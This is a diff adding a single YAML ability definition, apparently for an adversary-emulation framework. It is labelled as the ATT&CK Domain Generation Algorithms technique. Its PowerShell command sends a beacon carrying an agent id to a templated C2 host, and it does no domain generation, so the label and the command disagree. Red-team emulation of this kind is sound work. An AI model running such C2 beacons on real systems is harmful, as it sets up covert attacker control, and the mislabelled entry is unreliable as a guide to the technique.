@@ -1,0 +1,14 @@
+- id: 75f62855-8a44-457a-8635-b09f13d495be
+  name: Domain Generation Algorithms
+  description: Ability for Domain Generation Algorithms (ATT&CK T1483). Generated
+    from Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1483
+    name: Domain Generation Algorithms
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
